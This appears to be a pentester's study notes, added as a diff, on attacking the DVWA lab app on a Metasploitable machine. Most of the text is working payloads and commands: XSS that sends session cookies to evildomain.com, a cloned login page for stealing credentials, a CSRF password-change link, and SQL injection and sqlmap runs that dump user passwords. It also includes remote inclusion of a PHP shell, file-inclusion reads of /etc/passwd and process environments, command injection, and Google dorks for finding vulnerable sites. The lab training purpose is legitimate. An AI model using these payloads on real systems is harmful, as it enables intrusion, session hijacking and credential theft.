@@ -1,0 +1,159 @@
+﻿DVWA
+msfIP is Metasploitable IP
+http://msfIP/dvwa/login.php
+admin:password
+
+1. XSS reflected 
+// SECURITY:Low (View Source)
+Tor
+<i>
+<font color=*blue*>
+<script>alert('XSS')</script>
+// session cookie grabbing, can be used, e.g., to change password
+// note that cookie has Max-Age and Expires data
+<script>alert(document.cookie)</script>
+<script>document.location='http://evildomain.com/getcookie?cookie='+document.cookie</script>
+
+// SECURITY:Medium (View Source)
+<body onload=alert("XSS")>
+<svg onload=alert(document.cookie)>
+<img """><SCRIPT>alert("XSS")</SCRIPT>">
+// overwrite page content (deface)
+<a href="http://bt.no">NRK</a>
+<script>document.body.innerHTML='This is a new page';</script>
+
+// lot of payloads that pass filters are available, try them
+// svg Scalable Vector Graphics
+"><svg onload=alert("XSS")>
+"><svg onload=alert(document.cookie)>
+"><img src=x onerror=alert(1)>
+
+// image file upload, hide cript in filename
+<svg onload=alert("XSS")>.jpg
+"><svg onload=alert("XSS")>.jpg
+
+2. XSS Stored
+// SECURITY:Low  (View Source)
+// intrcept with Burp or
+// in browser, inspect element, change maxlength to 100
+<script>alert("XSS")</script>
+<script>window.location='https://www.google.com'</script> // page redirect
+<iframe>src="https://www.google.com"</iframe>
+<script>alert(document.cookie)</script>
+
+x // in both fields, intercept POST in Burp, change to
+txtName=<script>alert('XSS')</script>
+
+// SECURITY:Medium (View Source)
+<img """><SCRIPT>alert("XSS")</SCRIPT>">
+
+// redirect victim to cloned login page, steal usn:pwd
+// in Kali terminal
+setoolkit
+1 2 3 2 // Site Cloner
+KaliIP
+msfIP/dvwa/login.php
+
+service apache2 start
+// in DVWA, redirect to the cloned website
+<script>window.location="http://KaliIP/"</script>
+
+3. CSRF
+// user is logged in DVWA (authenticated with cookie)
+// user is tricked to click the link
+http://msfIP/dvwa/vulnerabilities/csrf/?password_new=12345&password_conf=12345&Change=Change#
+// or hide in html page containng
+<img height="0" width="0" src="previous link">
+<img src="some_photo.jpg">
+
+4. SQL Injection
+// find SQLi vulnerable sites - Google for inurl:index.php?id=
+// pages which is directly talking to the database
+
+// SECURITY:Low
+// in DVWA-SQL Injection-Submit window (PUT SPACE AFTER --) or in url (PUT SPACE BEFORE &Submit)
+1
+' // error message indicates vulnerability
+' or '1'='1
+
+// Boolean-based
+id=1' and '1'='1
+id=1' and '1'='2
+id=1' and ASCII(Substr((SELECT @@version),1,1))<54 // gives error
+id=1' and ASCII(Substr((SELECT @@version),1,1))<54--
+
+// UNION-based
+' union select 1,2,3--
+' union select 1,2--
+' union select user(),version()-- // 5.0.51a-3ubuntu5 MySQL version (vulnerable)
+' union select null,table_name from information_schema.tables-- // found that table named users exists
+' union select table_name,column_name from information_schema.columns where table_name='users'--
+' union select user,password from users--
+
+// SECURITY:Medium
+// escaping input, do not use quotes
+// send all requests listed in SECURITY:Low
+1 or 1=1 union select user,password from users--
+
+// Error-based
+1
+' // error message other than "No such user" indicates vulnerability
+' and col_name is null-- // bruteforce column names in the table (that is part of the query) 
+// find first_name, last_name, user, user_id, password
+' and 1=(select count(*) from table_name)-- // bruteforce table names to find table users
+' and users.column_name is null-- // bruteforce table name (that is part of the query) and its column names
+// find columns user, user_id, password in table users
+' or users.user='user_name'-- // bruteforce user to find Pablo, admin
+' or users.user like '%Pabl%'--
+' or users.user like 'admi%'--
+pablo' and pwd='rtfm-luser // bruteforce password
+
+// using SQLmap for SECURITY:Low/Medium
+// in DVWA submit 1 and intercept GET in Burp or use Firefox F12-Storage-Cookies (SESSIONID has limited validity set by server, so needs to be regenerated)
+sqlmap -u "http://msfIP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=; security=low" --dbs
+    -D dvwa --tables
+    -D dvwa -T users --columns
+    -D dvwa -T users --dump
+
+5. File Inclusion
+// Google search for inurl:index.php?page=
+
+Remote File Inclusion
+// in DVWA check PHP Info
+// in Metasploitable
+sudo nano /etc/php5/cgi/php.ini
+// set allow_url_include to On
+sudo /etc/init.d/apache2 restart
+?page=http://google.com
+// run php console
+// on Kali copy phpshell.txt to /var/www/html/
+service apache2 start
+?page=http://<Kali IP>/phpshell.txt
+
+Local File Inclusion (path traversal)
+?page=../../robots.txt
+// website’s PHP configuration
+?page=../../phpinfo.php
+// show passwd file
+?page=../../../../../etc/passwd
+// matching of domain names with IP
+?page=../../../../../etc/hosts
+// info on Apache process Pid, PPid, Uid, source code location, environmental variables
+?page=../../../../../proc/self/status
+?page=../../../../../proc/self/cmdline
+?page=../../../../../proc/self/environ
+// shows your browser type (that you send in HTTP request) HTTP_USER_AGENT
+// send PHP script in place of HTTP_USER_AGENT
+// visit the page, the script is read by the client, presented by the browser to the server side and executed
+
+// obtain server-side php source script by filter php wrapper and encoding
+?page=php://filter/convert.base64-encode/resource=include.php
+
+6. Command Injection
+// SECURITY:Low (View Source)
+msfIP
+msfIP & ls
+msfIP; pwd
+// use "&", "&&", "|", "||", ";"
+// Windows - dir, cd, type, copy, \
+// Linux - ls, cd, cat, less, /
